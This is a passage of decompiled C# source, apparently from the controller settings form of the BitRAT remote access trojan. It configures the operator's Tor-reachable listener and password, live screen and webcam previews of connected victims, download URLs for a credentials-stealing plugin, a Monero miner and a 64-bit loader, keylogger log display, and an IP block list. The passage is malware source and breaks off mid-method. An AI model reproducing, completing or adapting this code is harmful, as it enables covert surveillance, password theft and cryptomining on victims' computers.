            if ((!Versioned.IsNumeric(this.vmethod_22().Text) | (Conversion.Val(this.vmethod_22().Text) < 1.0)) | (Conversion.Val(this.vmethod_22().Text) > 65535.0))
            {
                Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_22().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_22().Text) > 32639.5, "65535", "1234"));
                this.vmethod_170().Enabled = true;
                return;
            }
            if (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
            {
                Interaction.MsgBox("Invalid port! Port must different than the Tor port.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_22().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_22().Text) > 32639.5, "65535", "1234"));
                this.vmethod_170().Enabled = true;
                return;
            }
            object text = (box = this.vmethod_18()).Text;
            ref object expression = ref text;
            box.Text = Conversions.ToString(text);
            if (Conversions.ToBoolean(Operators.NotObject((Strings.Len(expression) > 0) & (Strings.Len(expression) <= 0x10))))
            {
                Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_170().Enabled = true;
                return;
            }
            if (!File.Exists(Application.StartupPath + @"\data\tls\BitRAT.pfx"))
            {
                string[] strArray = Directory.GetFiles(Application.StartupPath + @"\data\tls", "*.*", SearchOption.TopDirectoryOnly);
                for (int i = 0; i < strArray.Length; i++)
                {
                    File.Delete(strArray[i]);
                }
                if (MessageBox.Show("A certificate was not found!\r\nA certificate is required before starting the socket.\r\n\r\nCreate one now?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
                {
                    this.method_45();
                }
                this.vmethod_170().Enabled = true;
                return;
            }
            Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
            Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
            Class135.smethod_0().Password = this.vmethod_18().Text;
            Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
            Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
            Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
            Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
            Class135.smethod_0().Save();
            ((Operators.CompareString(Class135.smethod_0().HostMainIP, null, true) == 0) ? new Thread(new ThreadStart(this._Lambda$__588-1)) : new Thread(new ThreadStart(this._Lambda$__588-0))).Start();
            if (Class130.struct18_0.method_0())
            {
                this.vmethod_170().Text = "Stop socket";
            }
        }
        this.vmethod_170().Enabled = true;
    }

    private void method_47(object sender, EventArgs e)
    {
        this.vmethod_172().Enabled = false;
        if (Class130.struct18_1.method_0())
        {
            this.fMain_0.method_29();
            this.vmethod_172().Text = "Start socket";
        }
        else
        {
            TextBox box;
            if ((!Versioned.IsNumeric(this.vmethod_134().Text) | (Conversion.Val(this.vmethod_134().Text) < 1.0)) | (Conversion.Val(this.vmethod_134().Text) > 65535.0))
            {
                Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_134().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_134().Text) > 32639.5, "65535", "1234"));
                this.vmethod_172().Enabled = true;
                return;
            }
            if (Operators.CompareString(this.vmethod_134().Text, this.vmethod_22().Text, true) == 0)
            {
                Interaction.MsgBox("Invalid port! Port must different than the Tor port.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_134().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_134().Text) > 32639.5, "65535", "1234"));
                this.vmethod_172().Enabled = true;
                return;
            }
            object text = (box = this.vmethod_18()).Text;
            ref object expression = ref text;
            box.Text = Conversions.ToString(text);
            if (Conversions.ToBoolean(Operators.NotObject((Strings.Len(expression) > 0) & (Strings.Len(expression) <= 0x10))))
            {
                Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_172().Enabled = true;
                return;
            }
            Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
            Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
            Class135.smethod_0().Password = this.vmethod_18().Text;
            Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
            Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
            Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
            Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
            Class135.smethod_0().Save();
            ((Operators.CompareString(Class135.smethod_0().HostMainIP, null, true) == 0) ? new Thread(new ThreadStart(this._Lambda$__589-1)) : new Thread(new ThreadStart(this._Lambda$__589-0))).Start();
            if (Class130.struct18_1.method_0())
            {
                this.vmethod_172().Text = "Stop socket";
            }
        }
        this.vmethod_172().Enabled = true;
    }

    private void method_48(object sender, EventArgs e)
    {
        if (Class130.struct18_0.method_0())
        {
            this.vmethod_170().Text = "Stop socket";
            this.vmethod_170().Refresh();
        }
        else
        {
            this.vmethod_170().Text = "Start socket";
            this.vmethod_170().Refresh();
        }
        if (Class130.struct18_1.method_0())
        {
            this.vmethod_172().Text = "Stop socket";
            this.vmethod_172().Refresh();
        }
        else
        {
            this.vmethod_172().Text = "Start socket";
            this.vmethod_172().Refresh();
        }
    }

    private void method_49(object sender, EventArgs e)
    {
    }

    private void method_5(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_52().Text) | (Conversion.Val(this.vmethod_52().Text) < 256.0)) | (Conversion.Val(this.vmethod_52().Text) > 65536.0))
        {
            this.vmethod_52().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_52().BackColor = Color.White;
        }
    }

    private void method_50(object sender, EventArgs e)
    {
        this.method_39();
    }

    public void method_51(bool bool_0)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_52(bool bool_0)
    {
        // Unresolved stack state at '0000000D'
    }

    private void method_53(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_22().Text) | (Conversion.Val(this.vmethod_22().Text) < 1.0)) | (Conversion.Val(this.vmethod_22().Text) > 65535.0))
        {
            Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_22().Select();
            this.vmethod_22().Focus();
        }
        else
        {
            TextBox box;
            object text = (box = this.vmethod_18()).Text;
            ref object expression = ref text;
            box.Text = Conversions.ToString(text);
            if (Conversions.ToBoolean(Operators.NotObject((Strings.Len(expression) > 0) & (Strings.Len(expression) <= 0x10))))
            {
                Interaction.MsgBox("Invalid password! Only Ascii values are allowed.", MsgBoxStyle.Critical, Application.ProductName);
                this.vmethod_18().Select();
                this.vmethod_18().Focus();
            }
            else
            {
                if (this.vmethod_120().TextLength > 0)
                {
                    bool flag;
                    string str = (box = this.vmethod_120()).Text;
                    ref string strRef = ref str;
                    if (true & Strings.LCase(strRef).StartsWith("https"))
                    {
                        flag = false;
                    }
                    else
                    {
                        if (strRef.ToLower().StartsWith("www."))
                        {
                            strRef = "http://" + strRef;
                        }
                        flag = Regex.IsMatch(strRef, @"http(s)?://([\w+?\.\w+])+([a-zA-Z0-9\~\!\@\#\$\%\^\&\*\(\)_\-\=\+\\\/\?\.\:\;\'\,]*)?");
                    }
                    box.Text = str;
                    if (!flag)
                    {
                        Interaction.MsgBox("Invalid URL!", MsgBoxStyle.Critical, Application.ProductName);
                        this.vmethod_120().Select();
                        this.vmethod_120().Focus();
                        return;
                    }
                }
                Class135.smethod_0().PortMain = Conversions.ToInteger(this.vmethod_22().Text);
                Class135.smethod_0().PortTor = Conversions.ToInteger(this.vmethod_134().Text);
                Class135.smethod_0().Password = this.vmethod_18().Text;
                Class135.smethod_0().HostMainIP = this.vmethod_14().Text;
                Class135.smethod_0().AutostartMain = this.vmethod_16().Checked;
                Class135.smethod_0().AutostartTor = this.vmethod_138().Checked;
                Class135.smethod_0().NetworkBandwidth = this.vmethod_120().Text;
                Class135.smethod_0().Save();
                Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
            }
        }
    }

    private void method_54(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_52().Text) | (Conversion.Val(this.vmethod_52().Text) < 256.0)) | (Conversion.Val(this.vmethod_52().Text) > 65536.0))
        {
            Interaction.MsgBox("Invalid Send buffer size! Value must be within the range 256-65536.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_52().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_52().Text) > 32640.0, "65536", "8192"));
            this.vmethod_52().BackColor = Color.White;
        }
        else if ((!Versioned.IsNumeric(this.vmethod_28().Text) | (Conversion.Val(this.vmethod_28().Text) < 256.0)) | (Conversion.Val(this.vmethod_28().Text) > 65536.0))
        {
            Interaction.MsgBox("Invalid Receive buffer size! Value must be within the range 256-65536.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_28().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_28().Text) > 32640.0, "65536", "8192"));
            this.vmethod_28().BackColor = Color.White;
        }
        else if ((!Versioned.IsNumeric(this.vmethod_140().Text) | (Conversion.Val(this.vmethod_140().Text) < 1.0)) | (Conversion.Val(this.vmethod_140().Text) > 50.0))
        {
            Interaction.MsgBox("Invalid maximum conccurent value! Value must be within the range 1-50.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_140().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_140().Text) > 50.0, "50", "5"));
            this.vmethod_140().BackColor = Color.White;
        }
        else if (!Versioned.IsNumeric(this.vmethod_150().Text) | (Conversion.Val(this.vmethod_150().Text) > 2147483647.0))
        {
            Interaction.MsgBox("Invalid maximum input speed value! Value must be within the range 0-" + Conversions.ToString(0x7fffffff), MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_150().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_150().Text) > 2147483647.0, 0x7fffffff, 0));
            this.vmethod_150().BackColor = Color.White;
        }
        else if (((Conversion.Val(this.vmethod_150().Text) * 1024.0) > 0.0) & (Conversion.Val(Conversion.Val(this.vmethod_150().Text) * 1024.0) < Conversion.Val(this.vmethod_28().Text)))
        {
            Interaction.MsgBox("Maximum input speed value may not be lower than receive buffer size!", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_150().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_28().Text) >= 8192.0, Conversion.Val(this.vmethod_28().Text) / 1024.0, 0));
            this.vmethod_150().BackColor = Color.White;
        }
        else if (!Versioned.IsNumeric(this.vmethod_156().Text) | (Conversion.Val(this.vmethod_156().Text) > 2147483647.0))
        {
            Interaction.MsgBox("Invalid maximum output speed value! Value must be within the range 0-" + Conversions.ToString(0x7fffffff), MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_156().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_156().Text) > 2147483647.0, 0x7fffffff, 0));
            this.vmethod_156().BackColor = Color.White;
        }
        else if (((Conversion.Val(this.vmethod_156().Text) * 1024.0) > 0.0) & ((Conversion.Val(this.vmethod_156().Text) * 1024.0) < Conversion.Val(this.vmethod_52().Text)))
        {
            Interaction.MsgBox("Maximum output speed value may not be lower than send buffer size!", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_156().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_52().Text) >= 8192.0, Conversion.Val(this.vmethod_52().Text) / 1024.0, 0));
            this.vmethod_156().BackColor = Color.White;
        }
        else
        {
            Class135.smethod_0().TransfersRecvBytes = (int) Math.Round(Conversion.Val(this.vmethod_28().Text));
            Class135.smethod_0().TransfersSendBytes = (int) Math.Round(Conversion.Val(this.vmethod_52().Text));
            Class135.smethod_0().TransfersConcurrentMax = (int) Math.Round(Conversion.Val(this.vmethod_140().Text));
            Class135.smethod_0().MaxBandwidthRateIn = (int) Math.Round(Conversion.Val(this.vmethod_150().Text));
            Class135.smethod_0().MaxBandwidthRateOut = (int) Math.Round(Conversion.Val(this.vmethod_156().Text));
            Class135.smethod_0().TransferReplaceExisting = this.vmethod_162().Checked;
            Class135.smethod_0().TransferReplaceFilesModified = this.vmethod_166().Checked;
            Class135.smethod_0().TransferReplaceFilesAll = this.vmethod_168().Checked;
            Class135.smethod_0().Save();
            new Thread((Class136.Class139.threadStart_0 == null) ? (Class136.Class139.threadStart_0 = new ThreadStart(Class136.Class139.class139_0._Lambda$__44-0)) : Class136.Class139.threadStart_0).Start();
            Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_55(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_92().Text) | (Conversion.Val(this.vmethod_92().Text) < 128.0)) | (Conversion.Val(this.vmethod_92().Text) > 1024.0))
        {
            Interaction.MsgBox("Invalid width for default size! Value must be within the range 128-1024.", MsgBoxStyle.Critical, Application.ProductName);
        }
        else if ((!Versioned.IsNumeric(this.vmethod_82().Text) | (Conversion.Val(this.vmethod_82().Text) < 128.0)) | (Conversion.Val(this.vmethod_82().Text) > 1920.0))
        {
            Interaction.MsgBox("Invalid width for double click size! Value must be within the range 128-1920.", MsgBoxStyle.Critical, Application.ProductName);
        }
        else if ((!Versioned.IsNumeric(this.vmethod_86().Text) | (Conversion.Val(this.vmethod_86().Text) < 128.0)) | (Conversion.Val(this.vmethod_86().Text) > 768.0))
        {
            Interaction.MsgBox("Invalid height for default size! Value must be within the range 128-768.", MsgBoxStyle.Critical, Application.ProductName);
        }
        else if ((!Versioned.IsNumeric(this.vmethod_76().Text) | (Conversion.Val(this.vmethod_76().Text) < 128.0)) | (Conversion.Val(this.vmethod_76().Text) > 1080.0))
        {
            Interaction.MsgBox("Invalid height for double click size! Value must be within the range 128-1080.", MsgBoxStyle.Critical, Application.ProductName);
        }
        else
        {
            Class135.smethod_0().PreviewEnabled = this.vmethod_60().Checked;
            Class135.smethod_0().PreviewSourceScreen = this.vmethod_66().Checked;
            Class135.smethod_0().PreviewSourceWebcam = this.vmethod_62().Checked;
            Class135.smethod_0().PreviewUpdateInterval = this.vmethod_72().Value;
            Class135.smethod_0().PreviewQuality = this.vmethod_104().Value;
            Class135.smethod_0().PreviewDefaultX = (int) Math.Round(Conversion.Val(this.vmethod_92().Text));
            Class135.smethod_0().PreviewDefaultY = (int) Math.Round(Conversion.Val(this.vmethod_86().Text));
            Class135.smethod_0().PreviewDoubleClickX = (int) Math.Round(Conversion.Val(this.vmethod_82().Text));
            Class135.smethod_0().PreviewDoubleClickY = (int) Math.Round(Conversion.Val(this.vmethod_76().Text));
            Class135.smethod_0().PreviewDefaultSize = Conversions.ToInteger(Strings.Replace(this.vmethod_98().Text, "%", string.Empty, 1, -1, CompareMethod.Text));
            Class135.smethod_0().PreviewDoubleClickSize = Conversions.ToInteger(Strings.Replace(this.vmethod_94().Text, "%", string.Empty, 1, -1, CompareMethod.Text));
            Class135.smethod_0().PreviewDisplayFrameData = this.vmethod_102().Checked;
            Class135.smethod_0().PreviewTransparentFrames = this.vmethod_110().Checked;
            Class135.smethod_0().Save();
            IEnumerator enumerator = Class130.fMain_0.vmethod_18().get_Objects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                Class136.Class138 class2;
                CClient current = (CClient) enumerator.Current;
                if (current.PREVIEW_SCREEN_IS_ENABLED)
                {
                    string[] textArray1 = new string[] { "screen_preview_settings|", Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval), "|", Conversions.ToString(Class135.smethod_0().PreviewQuality), "|" };
                    class2 = new Class136.Class138();
                    class2.string_0 = current.sKey;
                    class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(string.Concat(textArray1), Interaction.IIf(current.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
                if (current.PREVIEW_WEBCAM_IS_ENABLED)
                {
                    string[] textArray2 = new string[] { "webcam_preview_settings|", Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval), "|", Conversions.ToString(Class135.smethod_0().PreviewQuality), "|" };
                    class2 = new Class136.Class138();
                    class2.string_0 = current.sKey;
                    class2.string_1 = Conversions.ToString(Operators.ConcatenateObject(string.Concat(textArray2), Interaction.IIf(current.fPr.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)));
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_56(object sender, EventArgs e)
    {
        if ((((this.vmethod_126().Text.Length < 8) | !this.vmethod_126().Text.Contains("://")) | !this.vmethod_126().Text.Contains("http")) | !this.vmethod_126().Text.Contains("."))
        {
            Interaction.MsgBox("URL to 64-Bit loader plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_126().Select();
            this.vmethod_126().BackColor = Color.Red;
            this.vmethod_6().SelectedIndex = 3;
        }
        else if ((((this.vmethod_44().Text.Length < 8) | !this.vmethod_44().Text.Contains("://")) | !this.vmethod_44().Text.Contains("http")) | !this.vmethod_44().Text.Contains("."))
        {
            Interaction.MsgBox("URL to Credentials plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_6().SelectedIndex = 3;
            this.vmethod_44().Select();
            this.vmethod_44().BackColor = Color.Red;
        }
        else if ((((this.vmethod_42().Text.Length < 8) | !this.vmethod_42().Text.Contains("://")) | !this.vmethod_42().Text.Contains("http")) | !this.vmethod_42().Text.Contains("."))
        {
            Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_42().Select();
            this.vmethod_42().BackColor = Color.Red;
            this.vmethod_6().SelectedIndex = 3;
        }
        else if ((((this.vmethod_130().Text.Length < 8) | !this.vmethod_130().Text.Contains("://")) | !this.vmethod_130().Text.Contains("http")) | !this.vmethod_130().Text.Contains("."))
        {
            Interaction.MsgBox("URL to 64-Bit XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_130().Select();
            this.vmethod_130().BackColor = Color.Red;
            this.vmethod_6().SelectedIndex = 3;
        }
        else
        {
            Class135.smethod_0().PluginsURLLoader = this.vmethod_126().Text;
            Class135.smethod_0().PluginsURLPws = this.vmethod_44().Text;
            Class135.smethod_0().PluginsURLXMR = this.vmethod_42().Text;
            Class135.smethod_0().PluginsURLXMR64 = this.vmethod_130().Text;
            Class135.smethod_0().PluginsUpload = this.vmethod_114().Checked;
            Class135.smethod_0().PluginsSavePws = this.vmethod_262().Checked;
            Class135.smethod_0().Save();
            Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_57(object sender, EventArgs e)
    {
    }

    private void method_58(object sender, EventArgs e)
    {
        Class135.smethod_0().ConNotifications = this.vmethod_190().Checked;
        Class135.smethod_0().Gridlines = this.vmethod_188().Checked;
        Class135.smethod_0().ConKlgColors = this.vmethod_200().Checked;
        Class135.smethod_0().SettingsTray = this.vmethod_258().Checked;
        Class135.smethod_0().UIThumbnails = this.vmethod_264().Checked;
        Class135.smethod_0().Save();
        Class136.smethod_8(this.vmethod_188().Checked);
        Class130.fMain_0.method_5(this.vmethod_264().Checked);
        Class136.Class137 class2 = new Class136.Class137();
        class2.bool_0 = this.vmethod_264().Checked;
        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_59(object sender, EventArgs e)
    {
        Interaction.MsgBox("Enabling this feature will apply colors to titles and timestamps.\r\n\r\nWarning: You may wish to disable this feature if logs are loading slow.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_6(object sender, EventArgs e)
    {
        TextBox box;
        object text = (box = this.vmethod_18()).Text;
        ref object expression = ref text;
        box.Text = Conversions.ToString(text);
        if (Conversions.ToBoolean(Operators.NotObject((Strings.Len(expression) > 0) & (Strings.Len(expression) <= 0x10))))
        {
            this.vmethod_18().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_18().BackColor = Color.White;
        }
    }

    private void method_60(object sender, EventArgs e)
    {
        Interaction.MsgBox("If set, Tor will tell the kernel to attempt to shrink the buffers for all sockets to the size specified in constrained socket size. This is useful for virtual servers and other environments where system level TCP buffers may be limited. If you’re on a virtual server, and you encounter the\"Error creating network socket: No Buffer space available\" message, you are likely experiencing this problem.\r\n\r\nThe preferred solution is to have the admin increase the buffer pool for the host itself via /proc/sys/net/ipv4/tcp_mem or equivalent facility; this configuration option is a second-resort.\r\n\r\nNote: You should not enable this feature unless you encounter the \"no buffer space available\" issue. Reducing the TCP buffers affects window size for the TCP stream and will reduce throughput in proportion to round trip time on long paths.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_61(object sender, EventArgs e)
    {
        Interaction.MsgBox("When constrained sockets is enabled the receive and transmit buffers for all sockets will be set to this limit.\r\nMust be a value between 2048 and 262144, in 1024 byte increments. Default of 8192 is recommended.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_62(object sender, EventArgs e)
    {
        if (((!Versioned.IsNumeric(this.vmethod_222().Text) | (Conversion.Val(this.vmethod_222().Text) < 2048.0)) | (Conversion.Val(this.vmethod_222().Text) > 8192.0)) | !((Conversion.Val(this.vmethod_222().Text) % 1024.0) == 0.0))
        {
            this.vmethod_222().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_222().BackColor = Color.White;
        }
    }

    private void method_63(object sender, EventArgs e)
    {
        this.vmethod_222().Enabled = this.vmethod_216().Checked;
        this.vmethod_224().Enabled = this.vmethod_216().Checked;
    }

    private void method_64(object sender, EventArgs e)
    {
        if (this.vmethod_216().Checked && (((!Versioned.IsNumeric(this.vmethod_222().Text) | (Conversion.Val(this.vmethod_222().Text) < 2048.0)) | (Conversion.Val(this.vmethod_222().Text) > 8192.0)) | !((Conversion.Val(this.vmethod_222().Text) % 1024.0) == 0.0)))
        {
            Interaction.MsgBox("Invalid constrained socket size!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            Class135.smethod_0().TorDisableCaching = this.vmethod_206().Checked;
            Class135.smethod_0().TorAvoidDiskWrites = this.vmethod_210().Checked;
            Class135.smethod_0().TorRejectSingleHop = this.vmethod_212().Checked;
            Class135.smethod_0().TorNoExec = this.vmethod_218().Checked;
            Class135.smethod_0().TorUseConstrainedSockets = this.vmethod_216().Checked;
            Class135.smethod_0().TorConstrainedSocketSize = this.vmethod_222().Text;
            Class135.smethod_0().Save();
            Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_65(object sender, EventArgs e)
    {
        this.vmethod_18().PasswordChar = '\0';
        this.vmethod_230().Visible = true;
        this.vmethod_228().Visible = false;
    }

    private void method_66(object sender, EventArgs e)
    {
        this.vmethod_18().PasswordChar = '*';
        this.vmethod_228().Visible = true;
        this.vmethod_230().Visible = false;
    }

    private void method_67(object sender, EventArgs e)
    {
        Interaction.MsgBox("Connections from IP addresses in this list will be rejected.\r\n\r\nYou may also add ranges by adding * at the end of the IP.\r\nExample of blocking IP range 111.222.333.1 to 111.222.333.255, simply add 111.222.333.*", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_68(object sender, EventArgs e)
    {
        if (!Directory.Exists(Application.StartupPath + @"\data\settings"))
        {
            Directory.CreateDirectory(Application.StartupPath + @"\data\settings");
        }
        if (this.vmethod_244().get_Items().Count <= 0)
        {
            File.Delete(Application.StartupPath + @"\data\settings\firewall.txt");
            Interaction.MsgBox("Firewall list empty!", MsgBoxStyle.Information, Application.ProductName);
        }
        else
        {
            string left = string.Empty;
            int num = this.vmethod_244().get_Items().Count - 1;
            for (int i = 0; i <= num; i++)
            {
                left = Conversions.ToString(Operators.ConcatenateObject(left, Operators.ConcatenateObject(this.vmethod_244().get_Items()[i].Text, Interaction.IIf(i < (this.vmethod_244().get_Items().Count - 1), "\r\n", string.Empty))));
            }
            Class136.Class142 class2 = new Class136.Class142();
            class2.string_0 = Application.StartupPath + @"\data\settings\firewall.txt";
            class2.byte_0 = Encoding.UTF8.GetBytes(left);
            class2.bool_0 = false;
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            Interaction.MsgBox("Firewall list successfully saved!", MsgBoxStyle.Information, Application.ProductName);
        }
    }

    private void method_69(object sender, EventArgs e)
    {
        if (this.vmethod_238().TextLength < 3)
        {
            Interaction.MsgBox("Invalid IP!", MsgBoxStyle.Critical, Application.ProductName);
        }
        else
        {
            cFWIP item = new cFWIP();
            item.IP = this.vmethod_238().Text;
            item.ATTEMPTS = Conversions.ToString(0);
            Class130.concurrentQueue_0.Enqueue(item);
            Class130.concurrentDictionary_9.TryAdd(this.vmethod_238().Text, item);
            this.vmethod_238().Text = string.Empty;
        }
    }

    private void method_7(object sender, EventArgs e)
    {
        this.vmethod_42().BackColor = Color.White;
        if (Operators.CompareString(this.vmethod_42().Text, "URL to plugin: http://site.com/xmr.plg", true) == 0)
        {
            this.vmethod_42().Text = string.Empty;
            this.vmethod_42().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_42().Font, FontStyle.Regular);
            this.vmethod_42().Font = font;
        }
    }

    public void method_70()
    {
        if (this.vmethod_244().InvokeRequired)
        {
            this.vmethod_244().Invoke(new Delegate58(this.method_70), new object[0]);
        }
        else if (Class130.concurrentQueue_0.Count > 0)
        {
            this.vmethod_244().AddObjects(Enumerable.ToList<cFWIP>(Class130.concurrentQueue_0));
            Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
            this.vmethod_244().Update();
        }
    }

    public void method_71()
    {
        if (this.vmethod_244().InvokeRequired)
        {
            this.vmethod_244().Invoke(new Delegate62(this.method_71), new object[0]);
        }
        else if (Class130.concurrentQueue_1.Count > 0)
        {
            this.vmethod_244().RefreshObjects(Enumerable.ToList<cFWIP>(Class130.concurrentQueue_1));
            Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
            this.vmethod_244().Update();
        }
    }

    public void method_72()
    {
        if (this.vmethod_244().InvokeRequired)
        {
            this.vmethod_244().Invoke(new Delegate60(this.method_72), new object[0]);
        }
        else if (Class130.concurrentQueue_2.Count > 0)
        {
            this.vmethod_244().RemoveObjects(Enumerable.ToList<cFWIP>(Class130.concurrentQueue_2));
            Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
            this.vmethod_244().Update();
        }
    }

    private void method_73(object sender, DoWorkEventArgs e)
    {
        while (true)
        {
            this.method_70();
            this.method_71();
            this.method_72();
            Thread.Sleep(0x3e8);
        }
    }

    private void method_74(object sender, EventArgs e)
    {
        IEnumerator enumerator = this.vmethod_244().get_SelectedObjects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cFWIP current = (cFWIP) enumerator.Current;
            Class130.concurrentDictionary_9.TryRemove(current.IP, out current);
            Class130.concurrentQueue_2.Enqueue(current);
        }
    }

    private void method_75(object sender, EventArgs e)
    {
        fSettings settings = this;
        if (File.Exists(Application.StartupPath + @"\data\settings\firewall.txt"))
        {
            settings.vmethod_244().ClearObjects();
            Class130.concurrentDictionary_9.Clear();
            string[] strArray = Class136.smethod_3(Strings.Split(Class136.smethod_14(ref Application.StartupPath + @"\data\settings\firewall.txt"), "\r\n", -1, CompareMethod.Text));
            int num2 = strArray.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (strArray[i].Length > 0)
                {
                    cFWIP item = new cFWIP();
                    item.IP = strArray[i];
                    item.ATTEMPTS = Conversions.ToString(0);
                    Class130.concurrentQueue_0.Enqueue(item);
                    Class130.concurrentDictionary_9.TryAdd(strArray[i], item);
                }
            }
        }
        if (!settings.vmethod_250().IsBusy)
        {
            settings.vmethod_250().RunWorkerAsync();
        }
    }

    private void method_8(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_42().Text, string.Empty, true) == 0)
        {
            this.vmethod_42().Text = "URL to plugin: http://site.com/xmr.plg";
            this.vmethod_42().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_42().Font, FontStyle.Italic);
            this.vmethod_42().Font = font;
        }
    }

    private void method_9(object sender, EventArgs e)
    {
        this.vmethod_44().BackColor = Color.White;
        if (Operators.CompareString(this.vmethod_44().Text, "URL to plugin: http://site.com/pws.plg", true) == 0)
        {
            this.vmethod_44().Text = string.Empty;
            this.vmethod_44().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_44().Font, FontStyle.Regular);
            this.vmethod_44().Font = font;
        }
    }

    internal virtual Button vmethod_0()
    {
        return this.button_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(Button button_2)
    {
        this.button_0 = button_2;
    }

    internal virtual Label vmethod_10()
    {
        return this.label_0;
    }

    internal virtual Label vmethod_100()
    {
        return this.label_21;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_101(Label label_40)
    {
        this.label_21 = label_40;
    }

    internal virtual CheckBox vmethod_102()
    {
        return this.checkBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_103(CheckBox checkBox_18)
    {
        this.checkBox_2 = checkBox_18;
    }

    internal virtual TrackBar vmethod_104()
    {
